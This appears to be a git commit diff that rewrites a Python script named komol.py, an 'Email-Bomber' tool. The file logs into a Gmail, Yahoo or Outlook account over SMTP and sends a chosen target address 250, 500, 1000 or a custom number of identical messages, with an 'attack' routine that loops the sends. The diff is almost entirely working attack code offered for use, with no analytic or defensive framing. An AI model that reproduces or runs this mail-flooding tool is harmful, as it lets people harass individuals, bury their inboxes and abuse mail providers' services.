4842b60baf2147ce4614b12fdc45e521ccab81be
d1ab2020 <55600663+d1ab2020@users.noreply.github.com>
2019-09-21 04:28:35 +0800

    Update komol.py

--- komol.py
+++ komol.py
@@ -1,135 +1,130 @@
+#// Don't forget to hit SUBSCRIBE, COMMENT, LIKE, SHARE! and LEARN... :)
+# But srsly, hit that sub button so you don't miss out on more content! 
+
+
+'''imports'''
 import smtplib
-import platform
-import getpass
 import sys
-import datetime
 
 
-print "\n\n"
-print "********************************************************"
-print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
-print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
-print "|++++++++++++++++++++++\033[1;36mMail Bomber\033[0m+++++++++++++++++++++|"
-print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
-print "|+++++++++++++++++Author : \033[1;32mKOMOL SAHA\033[0m++++++++++++++++++|"
-print "|+++++++++++++++facebook/\033[32mKomal.razz11\033[0m++++++++++++++++++|"
-
-#Info
-os = platform.system()
-sys = platform.release()
-print "|+++++++++++++++++Operating System :" +os +"++++++++++++++|"
-
-print"|++++++++++++++Released :"+sys+"++++++++++++|"
-time = datetime.datetime.now()
-print "|+++++++\033[34mDate & Time\033[0m :"+str(time)+"++++++++|"
-print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
-print "|++++++++++++++++++++++++++++++++++++++++++++++++++++++|"
-print "********************************************************"
-
-print "\n"
+class bcolors:
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
 
 
+def banner():
+    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
+    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
+    print(bcolors.GREEN + '''
+                     \|/
+                       `--+--'
+                          |
+                      ,--'#`--.
+                      |#######|
+                   _.-'#######`-._
+                ,-'###############`-.
+              ,'#####################`,         .___     .__         .
+             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
+            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
+           |#############################|
+           |#############################|              Author: w3w3w3
+           |#############################|
+            |###########################|
+             \#########################/
+              `.#####################,'
+                `._###############_,'
+                   `--..#####..--'                                 ,-.--.
+*.______________________________________________________________,' (Bomb)
+                                                                    `--' ''')
 
 
-smtp   = raw_input("Enter Your Mail Server : ")
+class Email_Bomber:
+    count = 0
 
-if smtp == 'gmail':
-		server = smtplib.SMTP('smtp.gmail.com',587)
-		server.starttls()
+    def __init__(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
+            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
+            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
+            if int(self.mode) > int(4) or int(self.mode) < int(1):
+                print('ERROR: Invalid Option. GoodBye.')
+                sys.exit(1)
+        except Exception as e:
+            print(f'ERROR: {e}')
 
-		email     = raw_input("Enter Your Email : ")
-		password  = getpass.getpass("Enter the Password:")
+    def bomb(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
+            self.amount = None
+            if self.mode == int(1):
+                self.amount = int(1000)
+            elif self.mode == int(2):
+                self.amount = int(500)
+            elif self.mode == int(3):
+                self.amount = int(250)
+            else:
+                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
+            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
+        except Exception as e:
+            print(f'ERROR: {e}')
 
-		if not  email  and not password:
-				print ("You must Login Your Email")
-		else:
-				server.login(email,password)
-				print ("Successfully Signed in")
-				
-				send = raw_input("Please Enter Your Target Email : ")
+    def email(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
+            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
+            premade = ['1', '2', '3']
+            default_port = True
+            if self.server not in premade:
+                default_port = False
+                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
 
-				print("Up to 12000 messages")
-				thread= int(raw_input("Thread : "))
-				
+            if default_port == True:
+                self.port = int(587)
 
-				msg = raw_input("Enter Your Message here... :\n")
-				
-				
+            if self.server == '1':
+                self.server = 'smtp.gmail.com'
+            elif self.server == '2':
+                self.server = 'smtp.mail.yahoo.com'
+            elif self.server == '3':
+                self.server = 'smtp-mail.outlook.com'
 
-				for count in range(int(thread)):
-					server.sendmail(email,send,msg)
-					print (count,"Message Sent! : ")
-					count = count + 1
+            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
+            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
+            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
+            self.message = str(input(bcolors.GREEN + 'Enter message <: '))
 
+            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+            ''' % (self.fromAddr, self.target, self.subject, self.message)
 
+            self.s = smtplib.SMTP(self.server, self.port)
+            self.s.ehlo()
+            self.s.starttls()
+            self.s.ehlo()
+            self.s.login(self.fromAddr, self.fromPwd)
+        except Exception as e:
+            print(f'ERROR: {e}')
 
-				server.quit()
+    def send(self):
+        try:
+            self.s.sendmail(self.fromAddr, self.target, self.msg)
+            self.count +=1
+            print(bcolors.YELLOW + f'BOMB: {self.count}')
+        except Exception as e:
+            print(f'ERROR: {e}')
 
-
-elif smtp == 'yahoo':
-	server = smtplib.SMTP('smtp.mail.yahoo.com',465)
-	server.starttls()
-			
-	email = raw_input("Enter Your Email : ")
-	password = getpass.getpass("Enter the Password:")
-
-	if not  email  and not password:
-		print ("You must Login Your Email")
-	else:
-		server.login(email,password)
-		print ("Successfully Signed in")
-	
-		send = raw_input("Please Enter Your Target Email : ")
-
-		print("Up to 12000 messages")
-		thread= int(raw_input("Thread : "))
-						
-
-		msg = raw_input("Enter Your Message here... :\n")
-						
-	
-
-		for count in range(int(thread)):
-			server.sendmail(email,send,msg)
-			print (count,"Message Sent! : ")
-			count = count + 1
-
-
-
-		server.quit()
-
-elif smtp == 'hotmail':
-		server = smtplib.SMTP('smtp-mail.outlook.com',587)
-		server.starttls()
-
-		email = raw_input("Enter Your Email : ")
-		password = getpass.getpass("Enter the Password:")
-
-		if not  email  and not password:
-			print ("You must Login Your Email")
-		else:
-			server.login(email,password)
-			print ("Successfully Signed in")
-						
-			send = raw_input("Please Enter Your Target Email : ")
-
-			print("Up to 12000 messages")
-			thread= int(raw_input("Thread : "))
-						
-
-			msg = raw_input("Enter Your Message here... :\n")
-						
-						
-
-			for count in range(int(thread)):
-				server.sendmail(email,send,msg)
-				print (count,"Message Sent! : ")
-				count = count + 1
-				server.quit()
+    def attack(self):
+        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+        for email in range(self.amount+1):
+            self.send()
+        self.s.close()
+        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        sys.exit(0)
 
 
-else:
-		print("You Must Choose One Mail Server : GMAIL/YAHOO/HOTMAIL")				
-
-
-
+if __name__=='__main__':
+    banner()
+    bomb = Email_Bomber()
+    bomb.bomb()
+    bomb.email()
+    bomb.attack()
